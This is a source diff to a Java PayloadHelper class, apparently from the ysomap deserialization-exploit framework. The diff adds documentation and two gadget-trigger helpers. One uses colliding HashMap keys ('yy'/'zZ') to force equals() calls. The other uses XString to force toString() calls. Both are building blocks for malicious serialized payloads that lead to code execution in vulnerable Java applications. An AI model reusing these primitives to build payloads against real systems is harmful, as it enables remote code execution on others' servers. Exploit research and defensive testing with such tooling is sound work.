@@ -129,7 +129,13 @@ public class PayloadHelper {
         return set;
     }
 
-    // triger compareTo function
+    /**
+     * trigger a.compare(b)
+     * @param a
+     * @param b
+     * @return
+     * @throws Exception
+     */
     public static Object makePriorityQueue(Object a, Object b) throws Exception {
         // create queue with numbers and basic comparator
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
@@ -143,7 +149,13 @@ public class PayloadHelper {
         return queue;
     }
 
-    public static Object makeTreeSetWithXString(Object obj) throws Exception {
+    /**
+     * trigger obj.toString for non-serializable payload
+     * @param obj
+     * @return
+     * @throws Exception
+     */
+    public static Object makeTreeSetWithXStringToStringTrigger(Object obj) throws Exception {
         Object rdnEntry1 = ReflectionHelper.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
         ReflectionHelper.setFieldValue(rdnEntry1, "type", "ysomap");
         ReflectionHelper.setFieldValue(rdnEntry1, "value", new XString("test"));
@@ -293,6 +305,35 @@ public class PayloadHelper {
         vector.add(obj);
         ReflectionHelper.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
         return list;
+    }
+
+    /**
+     * trigger obj2.equals(obj1)
+     * @param obj1
+     * @param obj2
+     * @return
+     * @throws Exception
+     */
+    public static Object makeHashmapEqualsTrigger(Object obj1, Object obj2) throws Exception {
+        Map<String, Object> map1 = new HashMap<>();
+        Map<String, Object> map2 = new HashMap<>();
+        map1.put("yy", obj1);
+        map1.put("zZ", obj2);
+
+        map2.put("yy", obj2);
+        map2.put("zZ", obj1);
+        return makeMap(map1, map2);
+    }
+
+    /**
+     * trigger obj.toString()
+     * @param obj
+     * @return
+     * @throws Exception
+     */
+    public static Object makeXStringToStringTrigger(Object obj) throws Exception {
+        XString xString = new XString("ysomap");
+        return makeHashmapEqualsTrigger(obj, xString);
     }
 
     /**
